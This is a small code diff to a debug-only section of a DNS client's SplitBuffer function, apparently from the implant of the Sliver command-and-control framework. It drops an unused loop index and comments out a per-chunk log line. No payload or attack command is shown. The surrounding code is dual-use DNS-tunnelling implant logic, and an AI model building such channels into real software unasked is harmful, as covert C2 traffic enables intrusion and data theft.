@@ -680,7 +680,7 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 
 	// {{if .Config.Debug}}
 	total := 0
-	for index, domain := range encodedSubdata {
+	for _, domain := range encodedSubdata {
 		dnsMsg := &dnspb.DNSMessage{}
 		rawData, err := encoder.Decode([]byte(domain))
 		if err != nil {
@@ -689,8 +689,8 @@ func (s *SliverDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.En
 		}
 		proto.Unmarshal(rawData, dnsMsg)
 		total += len(dnsMsg.Data)
-		log.Printf("[dns] subdata %d (%d->%d): %d bytes",
-			index, dnsMsg.Start, int(dnsMsg.Start)+len(dnsMsg.Data), len(dnsMsg.Data))
+		// log.Printf("[dns] subdata %d (%d->%d): %d bytes",
+		// 	index, dnsMsg.Start, int(dnsMsg.Start)+len(dnsMsg.Data), len(dnsMsg.Data))
 	}
 	log.Printf("[dns] original data: %d bytes", len(data))
 	log.Printf("[dns] total subdata: %d bytes", total)
